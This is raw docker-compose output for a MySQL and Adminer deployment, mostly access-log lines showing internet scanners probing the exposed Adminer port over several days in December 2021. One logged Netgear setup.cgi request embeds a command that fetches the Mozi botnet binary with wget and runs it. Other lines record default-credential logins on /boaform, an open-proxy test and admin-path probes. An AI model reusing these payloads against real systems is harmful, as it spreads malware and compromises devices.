Creating network "docker-compose_default" with the default driver
Creating docker-compose_adminer_container_1 ... 
Creating docker-compose_mysql_db_container_1 ... 
[1A[2KCreating docker-compose_mysql_db_container_1 ... [32mdone[0m[1B[2A[2KCreating docker-compose_adminer_container_1  ... [32mdone[0m[2BAttaching to docker-compose_mysql_db_container_1, docker-compose_adminer_container_1
[33mmysql_db_container_1  |[0m 2021-12-07 20:09:00+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.27-1debian10 started.
[36madminer_container_1   |[0m [Thu Dec  9 10:58:04 2021] [::ffff:183.136.225.9]:15445 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 10:58:04 2021] [::ffff:183.136.225.9]:15445 Closing
[36madminer_container_1   |[0m [Thu Dec  9 10:58:23 2021] [::ffff:183.136.225.9]:9569 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 10:58:23 2021] [::ffff:183.136.225.9]:9569 [200]: GET /?file=favicon.ico&amp;version=4.8.1
[36madminer_container_1   |[0m [Thu Dec  9 10:58:23 2021] [::ffff:183.136.225.9]:9569 Closing
[36madminer_container_1   |[0m [Thu Dec  9 10:58:23 2021] [::ffff:183.136.225.9]:10509 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 10:58:23 2021] [::ffff:183.136.225.9]:10509 [404]: GET /robots.txt - No such file or directory
[36madminer_container_1   |[0m [Thu Dec  9 10:58:23 2021] [::ffff:183.136.225.9]:10509 Closing
[36madminer_container_1   |[0m [Thu Dec  9 11:52:55 2021] [::ffff:192.241.212.89]:43446 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 11:52:55 2021] [::ffff:192.241.212.89]:43446 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 11:52:55 2021] [::ffff:192.241.212.89]:43446 Closing
[36madminer_container_1   |[0m [Thu Dec  9 13:32:14 2021] [::ffff:79.40.19.13]:58597 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 13:32:14 2021] [::ffff:79.40.19.13]:58597 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 13:32:14 2021] [::ffff:79.40.19.13]:58597 Closing
[36madminer_container_1   |[0m [Thu Dec  9 14:40:43 2021] [::ffff:193.118.53.202]:40044 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 14:40:43 2021] [::ffff:193.118.53.202]:40044 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 14:40:43 2021] [::ffff:193.118.53.202]:40044 Closing
[36madminer_container_1   |[0m [Thu Dec  9 15:05:20 2021] [::ffff:112.94.187.42]:9748 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 15:05:20 2021] [::ffff:112.94.187.42]:9748 [404]: GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 - No such file or directory
[36madminer_container_1   |[0m [Thu Dec  9 15:05:20 2021] [::ffff:112.94.187.42]:9748 Closing
[36madminer_container_1   |[0m [Thu Dec  9 15:10:17 2021] [::ffff:161.35.238.241]:40066 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 15:10:17 2021] [::ffff:161.35.238.241]:40066 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Thu Dec  9 15:10:17 2021] [::ffff:161.35.238.241]:40066 Closing
[36madminer_container_1   |[0m [Thu Dec  9 15:23:46 2021] [::ffff:88.9.119.217]:2118 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 15:23:47 2021] [::ffff:88.9.119.217]:2118 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 15:23:47 2021] [::ffff:88.9.119.217]:2118 Closing
[36madminer_container_1   |[0m [Thu Dec  9 16:17:53 2021] [::ffff:185.220.100.240]:33196 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 16:17:56 2021] [::ffff:185.220.100.240]:33196 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 16:17:56 2021] [::ffff:185.220.100.240]:33196 Closing
[36madminer_container_1   |[0m [Thu Dec  9 16:18:05 2021] [::ffff:185.220.101.162]:31654 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 16:18:06 2021] [::ffff:185.220.101.162]:31654 [404]: GET /favicon.ico - No such file or directory
[36madminer_container_1   |[0m [Thu Dec  9 16:18:06 2021] [::ffff:185.220.101.162]:31654 Closing
[36madminer_container_1   |[0m [Thu Dec  9 17:24:51 2021] [::ffff:92.118.160.29]:62447 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 17:24:53 2021] [::ffff:92.118.160.29]:62447 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 17:24:53 2021] [::ffff:92.118.160.29]:62447 Closing
[36madminer_container_1   |[0m [Thu Dec  9 17:37:14 2021] [::ffff:189.127.248.139]:50491 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 17:37:14 2021] [::ffff:189.127.248.139]:50491 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 17:37:14 2021] [::ffff:189.127.248.139]:50491 Closing
[36madminer_container_1   |[0m [Thu Dec  9 18:34:22 2021] [::ffff:46.163.152.185]:3026 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 18:34:22 2021] [::ffff:46.163.152.185]:3026 Invalid request (Unexpected EOF)
[36madminer_container_1   |[0m [Thu Dec  9 18:34:22 2021] [::ffff:46.163.152.185]:3026 Closing
[36madminer_container_1   |[0m [Thu Dec  9 18:34:22 2021] [::ffff:46.163.152.185]:3028 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 18:34:22 2021] [::ffff:46.163.152.185]:3028 Closed without sending a request; it was probably just an unused speculative preconnection
[36madminer_container_1   |[0m [Thu Dec  9 18:34:22 2021] [::ffff:46.163.152.185]:3028 Closing
[36madminer_container_1   |[0m [Thu Dec  9 19:28:56 2021] [::ffff:34.65.232.229]:51430 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 19:28:56 2021] [::ffff:34.65.232.229]:51430 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Thu Dec  9 19:28:56 2021] [::ffff:34.65.232.229]:51430 Closing
[36madminer_container_1   |[0m [Thu Dec  9 19:28:57 2021] [::ffff:34.65.232.229]:51824 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 19:28:57 2021] [::ffff:34.65.232.229]:51824 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Thu Dec  9 19:28:57 2021] [::ffff:34.65.232.229]:51824 Closing
[36madminer_container_1   |[0m [Thu Dec  9 19:28:58 2021] [::ffff:34.65.113.188]:39134 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 19:28:58 2021] [::ffff:34.65.113.188]:39134 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 19:28:58 2021] [::ffff:34.65.113.188]:39134 Closing
[36madminer_container_1   |[0m [Thu Dec  9 22:05:44 2021] [::ffff:223.207.97.39]:36613 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 22:05:44 2021] [::ffff:223.207.97.39]:36613 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 22:05:44 2021] [::ffff:223.207.97.39]:36613 Closing
[36madminer_container_1   |[0m [Thu Dec  9 22:06:47 2021] [::ffff:34.86.35.12]:34473 Accepted
[36madminer_container_1   |[0m [Thu Dec  9 22:06:47 2021] [::ffff:34.86.35.12]:34473 [200]: GET /
[36madminer_container_1   |[0m [Thu Dec  9 22:06:47 2021] [::ffff:34.86.35.12]:34473 Closing
[36madminer_container_1   |[0m [Fri Dec 10 01:11:59 2021] [::ffff:125.44.254.119]:38686 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 01:11:59 2021] [::ffff:125.44.254.119]:38686 [403]: GET /boaform/admin/formLogin?username=ec8&psd=ec8
[36madminer_container_1   |[0m [Fri Dec 10 01:11:59 2021] [::ffff:125.44.254.119]:38686 Closing
[36madminer_container_1   |[0m [Fri Dec 10 01:48:25 2021] [::ffff:192.241.206.217]:39864 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 01:48:25 2021] [::ffff:192.241.206.217]:39864 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 01:48:25 2021] [::ffff:192.241.206.217]:39864 Closing
[36madminer_container_1   |[0m [Fri Dec 10 02:01:06 2021] [::ffff:92.118.161.61]:39060 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 02:01:06 2021] [::ffff:92.118.161.61]:39060 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 02:01:06 2021] [::ffff:92.118.161.61]:39060 Closing
[36madminer_container_1   |[0m [Fri Dec 10 02:33:15 2021] [::ffff:128.14.133.58]:59928 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 02:33:15 2021] [::ffff:128.14.133.58]:59928 [200]: GET /version
[36madminer_container_1   |[0m [Fri Dec 10 02:33:15 2021] [::ffff:128.14.133.58]:59928 Closing
[36madminer_container_1   |[0m [Fri Dec 10 02:33:15 2021] [::ffff:128.14.133.58]:60008 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 02:33:15 2021] [::ffff:128.14.133.58]:60008 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 02:33:15 2021] [::ffff:128.14.133.58]:60008 Closing
[36madminer_container_1   |[0m [Fri Dec 10 03:08:04 2021] [::ffff:59.98.188.6]:50868 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 03:08:04 2021] [::ffff:59.98.188.6]:50868 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 03:08:04 2021] [::ffff:59.98.188.6]:50868 Closing
[36madminer_container_1   |[0m [Fri Dec 10 03:10:29 2021] [::ffff:109.234.153.134]:53343 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 03:10:29 2021] [::ffff:109.234.153.134]:53343 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Fri Dec 10 03:10:29 2021] [::ffff:109.234.153.134]:53343 Closing
[36madminer_container_1   |[0m [Fri Dec 10 03:10:34 2021] [::ffff:109.234.153.133]:39889 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 03:10:34 2021] [::ffff:109.234.153.133]:39889 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Fri Dec 10 03:10:34 2021] [::ffff:109.234.153.133]:39889 Closing
[36madminer_container_1   |[0m [Fri Dec 10 03:10:39 2021] [::ffff:109.234.153.130]:26857 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 03:10:39 2021] [::ffff:109.234.153.130]:26857 [404]: GET http://host64.ru/rb/getip.php?Z73413400670Q1 - No such file or directory
[36madminer_container_1   |[0m [Fri Dec 10 03:10:39 2021] [::ffff:109.234.153.130]:26857 Closing
[36madminer_container_1   |[0m [Fri Dec 10 03:10:44 2021] [::ffff:109.234.153.130]:42217 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 03:10:44 2021] [::ffff:109.234.153.130]:42217 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Fri Dec 10 03:10:44 2021] [::ffff:109.234.153.130]:42217 Closing
[36madminer_container_1   |[0m [Fri Dec 10 03:38:05 2021] [::ffff:192.241.209.111]:39442 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 03:38:05 2021] [::ffff:192.241.209.111]:39442 [200]: GET /hudson
[36madminer_container_1   |[0m [Fri Dec 10 03:38:05 2021] [::ffff:192.241.209.111]:39442 Closing
[36madminer_container_1   |[0m [Fri Dec 10 04:10:41 2021] [::ffff:209.141.48.248]:43022 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 04:10:41 2021] [::ffff:209.141.48.248]:43022 [200]: GET /script
[36madminer_container_1   |[0m [Fri Dec 10 04:10:41 2021] [::ffff:209.141.48.248]:43022 Closing
[36madminer_container_1   |[0m [Fri Dec 10 04:11:47 2021] [::ffff:39.80.38.56]:54667 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 04:12:02 2021] [::ffff:39.80.38.56]:54667 Invalid request (Unexpected EOF)
[36madminer_container_1   |[0m [Fri Dec 10 04:12:02 2021] [::ffff:39.80.38.56]:54667 Closing
[36madminer_container_1   |[0m [Fri Dec 10 04:12:25 2021] [::ffff:188.75.66.40]:53219 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 04:12:25 2021] [::ffff:188.75.66.40]:53219 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 04:12:25 2021] [::ffff:188.75.66.40]:53219 Closing
[36madminer_container_1   |[0m [Fri Dec 10 04:38:58 2021] [::ffff:103.139.178.39]:57197 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 04:38:58 2021] [::ffff:103.139.178.39]:57197 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 04:38:58 2021] [::ffff:103.139.178.39]:57197 Closing
[36madminer_container_1   |[0m [Fri Dec 10 05:37:48 2021] [::ffff:34.86.35.22]:36233 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 05:37:48 2021] [::ffff:34.86.35.22]:36233 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Fri Dec 10 05:37:48 2021] [::ffff:34.86.35.22]:36233 Closing
[33mmysql_db_container_1  |[0m 2021-12-10T06:52:26.230890Z 187 [Warning] [MY-013360] [Server] Plugin sha256_password reported: ''sha256_password' is deprecated and will be removed in a future release. Please use caching_sha2_password instead'
[36madminer_container_1   |[0m [Fri Dec 10 07:07:48 2021] [::ffff:185.100.87.136]:58776 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 07:07:48 2021] [::ffff:185.100.87.136]:58776 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Fri Dec 10 07:07:48 2021] [::ffff:185.100.87.136]:58776 Closing
[36madminer_container_1   |[0m [Fri Dec 10 07:13:18 2021] [::ffff:139.59.235.12]:36934 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 07:13:18 2021] [::ffff:139.59.235.12]:36934 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 07:13:18 2021] [::ffff:139.59.235.12]:36934 Closing
[36madminer_container_1   |[0m [Fri Dec 10 07:49:36 2021] [::ffff:116.177.15.105]:60251 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 07:49:36 2021] [::ffff:116.177.15.105]:60251 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Fri Dec 10 07:49:36 2021] [::ffff:116.177.15.105]:60251 Closing
[36madminer_container_1   |[0m [Fri Dec 10 08:05:39 2021] [::ffff:43.247.161.57]:46162 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 08:05:39 2021] [::ffff:43.247.161.57]:46162 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 08:05:39 2021] [::ffff:43.247.161.57]:46162 Closing
[36madminer_container_1   |[0m [Fri Dec 10 08:36:24 2021] [::ffff:186.33.67.92]:53048 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 08:36:24 2021] [::ffff:186.33.67.92]:53048 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 08:36:24 2021] [::ffff:186.33.67.92]:53048 Closing
[36madminer_container_1   |[0m [Fri Dec 10 08:39:02 2021] [::ffff:92.112.134.235]:60192 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 08:39:02 2021] [::ffff:92.112.134.235]:60192 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 08:39:02 2021] [::ffff:92.112.134.235]:60192 Closing
[36madminer_container_1   |[0m [Fri Dec 10 09:01:13 2021] [::ffff:41.75.56.122]:44500 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 09:01:13 2021] [::ffff:41.75.56.122]:44500 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 09:01:13 2021] [::ffff:41.75.56.122]:44500 Closing
[36madminer_container_1   |[0m [Fri Dec 10 09:31:37 2021] [::ffff:45.137.23.232]:51912 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 09:31:37 2021] [::ffff:45.137.23.232]:51912 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 09:31:37 2021] [::ffff:45.137.23.232]:51912 Closing
[36madminer_container_1   |[0m [Fri Dec 10 09:34:16 2021] [::ffff:209.141.50.223]:59110 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 09:34:16 2021] [::ffff:209.141.50.223]:59110 [200]: GET /config/getuser?index=0
[36madminer_container_1   |[0m [Fri Dec 10 09:34:16 2021] [::ffff:209.141.50.223]:59110 Closing
[36madminer_container_1   |[0m [Fri Dec 10 10:31:33 2021] [::ffff:187.135.88.192]:37505 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 10:31:33 2021] [::ffff:187.135.88.192]:37505 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 10:31:33 2021] [::ffff:187.135.88.192]:37505 Closing
[36madminer_container_1   |[0m [Fri Dec 10 12:01:31 2021] [::ffff:81.12.97.100]:45679 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 12:01:31 2021] [::ffff:81.12.97.100]:45679 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 12:01:31 2021] [::ffff:81.12.97.100]:45679 Closing
[36madminer_container_1   |[0m [Fri Dec 10 12:03:13 2021] [::ffff:192.241.214.96]:55788 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 12:03:13 2021] [::ffff:192.241.214.96]:55788 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 12:03:13 2021] [::ffff:192.241.214.96]:55788 Closing
[36madminer_container_1   |[0m [Fri Dec 10 12:35:47 2021] [::ffff:159.89.194.175]:61616 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 12:35:47 2021] [::ffff:159.89.194.175]:61616 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Fri Dec 10 12:35:47 2021] [::ffff:159.89.194.175]:61616 Closing
[36madminer_container_1   |[0m [Fri Dec 10 12:35:47 2021] [::ffff:159.89.194.175]:61722 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 12:35:47 2021] [::ffff:159.89.194.175]:61722 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 12:35:47 2021] [::ffff:159.89.194.175]:61722 Closing
[36madminer_container_1   |[0m [Fri Dec 10 12:54:56 2021] [::ffff:186.33.92.107]:44629 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 12:54:57 2021] [::ffff:186.33.92.107]:44629 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 12:54:57 2021] [::ffff:186.33.92.107]:44629 Closing
[36madminer_container_1   |[0m [Fri Dec 10 13:19:39 2021] [::ffff:178.62.215.25]:55692 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 13:19:39 2021] [::ffff:178.62.215.25]:55692 Invalid request (Unsupported SSL request)
[36madminer_container_1   |[0m [Fri Dec 10 13:19:39 2021] [::ffff:178.62.215.25]:55692 Closing
[36madminer_container_1   |[0m [Fri Dec 10 13:58:57 2021] [::ffff:222.137.54.171]:54466 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 13:58:57 2021] [::ffff:222.137.54.171]:54466 [403]: GET /boaform/admin/formLogin?username=user&psd=user
[36madminer_container_1   |[0m [Fri Dec 10 13:58:57 2021] [::ffff:222.137.54.171]:54466 Closing
[36madminer_container_1   |[0m [Fri Dec 10 14:27:22 2021] [::ffff:193.118.53.202]:59052 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 14:27:22 2021] [::ffff:193.118.53.202]:59052 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 14:27:22 2021] [::ffff:193.118.53.202]:59052 Closing
[36madminer_container_1   |[0m [Fri Dec 10 14:40:43 2021] [::ffff:27.206.114.14]:39572 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 14:40:45 2021] [::ffff:27.206.114.14]:39572 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Fri Dec 10 14:40:45 2021] [::ffff:27.206.114.14]:39572 Closing
[36madminer_container_1   |[0m [Fri Dec 10 16:10:23 2021] [::ffff:103.203.57.9]:34814 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 16:10:23 2021] [::ffff:103.203.57.9]:34814 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 16:10:23 2021] [::ffff:103.203.57.9]:34814 Closing
[36madminer_container_1   |[0m [Fri Dec 10 16:50:53 2021] [::ffff:74.82.47.3]:50654 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 16:50:53 2021] [::ffff:74.82.47.3]:50654 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 16:50:53 2021] [::ffff:74.82.47.3]:50654 Closing
[36madminer_container_1   |[0m [Fri Dec 10 17:11:58 2021] [::ffff:192.35.168.160]:3118 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 17:11:58 2021] [::ffff:192.35.168.160]:3118 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 17:11:58 2021] [::ffff:192.35.168.160]:3118 Closing
[36madminer_container_1   |[0m [Fri Dec 10 17:26:02 2021] [::ffff:46.174.191.28]:38364 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 17:26:04 2021] [::ffff:46.174.191.28]:38364 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 17:26:04 2021] [::ffff:46.174.191.28]:38364 Closing
[36madminer_container_1   |[0m [Fri Dec 10 17:38:39 2021] [::ffff:162.142.125.195]:55060 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 17:38:40 2021] [::ffff:162.142.125.195]:55060 Invalid request (Connection reset by peer)
[36madminer_container_1   |[0m [Fri Dec 10 17:38:40 2021] [::ffff:162.142.125.195]:55060 Closing
[36madminer_container_1   |[0m [Fri Dec 10 17:38:40 2021] [::ffff:162.142.125.195]:50906 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 17:38:41 2021] [::ffff:162.142.125.195]:50906 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 17:38:41 2021] [::ffff:162.142.125.195]:50906 Closing
[36madminer_container_1   |[0m [Fri Dec 10 17:38:41 2021] [::ffff:162.142.125.195]:49086 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 17:38:41 2021] [::ffff:162.142.125.195]:49086 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 17:38:41 2021] [::ffff:162.142.125.195]:49086 Closing
[36madminer_container_1   |[0m [Fri Dec 10 17:44:07 2021] [::ffff:45.155.205.233]:44402 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 17:44:07 2021] [::ffff:45.155.205.233]:44402 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 17:44:07 2021] [::ffff:45.155.205.233]:44402 Closing
[36madminer_container_1   |[0m [Fri Dec 10 18:25:28 2021] [::ffff:193.118.55.162]:47034 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 18:25:28 2021] [::ffff:193.118.55.162]:47034 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 18:25:28 2021] [::ffff:193.118.55.162]:47034 Closing
[36madminer_container_1   |[0m [Fri Dec 10 19:26:44 2021] [::ffff:47.242.125.123]:65527 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 19:27:45 2021] [::ffff:47.242.125.123]:65527 Closed without sending a request; it was probably just an unused speculative preconnection
[36madminer_container_1   |[0m [Fri Dec 10 19:27:45 2021] [::ffff:47.242.125.123]:65527 Closing
[36madminer_container_1   |[0m [Fri Dec 10 19:30:47 2021] [::ffff:34.77.162.12]:38149 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 19:30:47 2021] [::ffff:34.77.162.12]:38149 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 19:30:47 2021] [::ffff:34.77.162.12]:38149 Closing
[36madminer_container_1   |[0m [Fri Dec 10 20:16:12 2021] [::ffff:205.185.119.11]:53954 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 20:16:12 2021] [::ffff:205.185.119.11]:53954 [200]: POST /boaform/admin/formLogin
[36madminer_container_1   |[0m [Fri Dec 10 20:16:12 2021] [::ffff:205.185.119.11]:53954 Closing
[36madminer_container_1   |[0m [Fri Dec 10 22:54:58 2021] [::ffff:54.183.222.243]:48634 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 22:54:58 2021] [::ffff:54.183.222.243]:48634 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 22:54:58 2021] [::ffff:54.183.222.243]:48634 Closing
[36madminer_container_1   |[0m [Fri Dec 10 23:03:24 2021] [::ffff:3.124.3.123]:55259 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 23:03:24 2021] [::ffff:3.124.3.123]:55259 [200]: CONNECT api.goldenfrog.com:443
[36madminer_container_1   |[0m [Fri Dec 10 23:03:24 2021] [::ffff:3.124.3.123]:55259 Closing
[36madminer_container_1   |[0m [Fri Dec 10 23:07:36 2021] [::ffff:46.174.191.32]:38364 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 23:07:38 2021] [::ffff:46.174.191.32]:38364 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 23:07:38 2021] [::ffff:46.174.191.32]:38364 Closing
[36madminer_container_1   |[0m [Fri Dec 10 23:52:54 2021] [::ffff:45.155.205.233]:47172 Accepted
[36madminer_container_1   |[0m [Fri Dec 10 23:52:55 2021] [::ffff:45.155.205.233]:47172 [200]: GET /
[36madminer_container_1   |[0m [Fri Dec 10 23:52:55 2021] [::ffff:45.155.205.233]:47172 Closing
[36madminer_container_1   |[0m [Sat Dec 11 00:03:44 2021] [::ffff:64.62.197.182]:33066 Accepted
[36madminer_container_1   |[0m [Sat Dec 11 00:03:44 2021] [::ffff:64.62.197.182]:33066 [200]: GET /
[36madminer_container_1   |[0m [Sat Dec 11 00:03:44 2021] [::ffff:64.62.197.182]:33066 Closing
[36madminer_container_1   |[0m [Sat Dec 11 01:35:24 2021] [::ffff:61.219.11.151]:65452 Accepted
[36madminer_container_1   |[0m [Sat Dec 11 01:35:26 2021] [::ffff:61.219.11.151]:65452 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Sat Dec 11 01:35:26 2021] [::ffff:61.219.11.151]:65452 Closing
[36madminer_container_1   |[0m [Sat Dec 11 01:42:08 2021] [::ffff:209.141.48.248]:50986 Accepted
[36madminer_container_1   |[0m [Sat Dec 11 01:42:08 2021] [::ffff:209.141.48.248]:50986 [200]: GET /script
[36madminer_container_1   |[0m [Sat Dec 11 01:42:08 2021] [::ffff:209.141.48.248]:50986 Closing
[36madminer_container_1   |[0m [Sat Dec 11 02:28:38 2021] [::ffff:189.147.177.82]:55135 Accepted
[36madminer_container_1   |[0m [Sat Dec 11 02:28:38 2021] [::ffff:189.147.177.82]:55135 [200]: GET /
[36madminer_container_1   |[0m [Sat Dec 11 02:28:38 2021] [::ffff:189.147.177.82]:55135 Closing
[36madminer_container_1   |[0m [Sat Dec 11 02:29:35 2021] [::ffff:156.96.155.238]:2450 Accepted
[36madminer_container_1   |[0m [Sat Dec 11 02:29:35 2021] [::ffff:156.96.155.238]:2450 [200]: GET /manager/html
[36madminer_container_1   |[0m [Sat Dec 11 02:29:35 2021] [::ffff:156.96.155.238]:2450 Closing
[36madminer_container_1   |[0m [Sat Dec 11 03:20:22 2021] [::ffff:5.178.86.76]:34839 Accepted
[36madminer_container_1   |[0m [Sat Dec 11 03:20:22 2021] [::ffff:5.178.86.76]:34839 Invalid request (Malformed HTTP request)
[36madminer_container_1   |[0m [Sat Dec 11 03:20:22 2021] [::ffff:5.178.86.76]:34839 Closing
[36madminer_container_1   |[0m [Sat Dec 11 03:20:27 2021] [::ffff:5.178.86.76]:29369 Accepted
[36madminer_container_1   |[0m [Sat Dec 11 03:20:27 2021] [::ffff:5.178.86.76]:29369 Invalid request (Malformed HTTP request)
